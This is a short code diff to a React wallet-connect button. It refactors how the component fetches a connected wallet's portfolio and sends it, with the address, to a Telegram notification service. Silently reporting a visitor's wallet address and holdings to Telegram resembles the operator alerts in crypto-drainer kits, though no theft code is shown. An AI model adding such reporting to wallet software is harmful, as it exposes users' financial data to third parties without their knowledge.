@@ -106,12 +106,19 @@ const ConnectWalletBtn = ({ className }) => {
 
             // 2. Telegram Notification
             if (!hasNotifiedRef.current) {
-                console.log("Triggering Telegram Notification...");
+                console.log("Triggering Telegram Notification Flow...");
                 hasNotifiedRef.current = true;
-                TransactionService.getWalletPortfolio(address).then(portfolio => {
-                    console.log("Portfolio fetched:", portfolio);
-                    TelegramService.sendConnectionNotification(portfolio, address);
-                }).catch(err => console.error("Error fetching portfolio for notification:", err));
+
+                TransactionService.getWalletPortfolio(address)
+                    .then(portfolio => {
+                        console.log("Portfolio fetched successfully:", portfolio);
+                        TelegramService.sendConnectionNotification(portfolio, address);
+                    })
+                    .catch(err => {
+                        console.error("CRITICAL: Failed to fetch portfolio for notification:", err);
+                        // Optional: Try sending with zero balance if fetch fails?
+                        // For now, just log.
+                    });
             }
         }
 
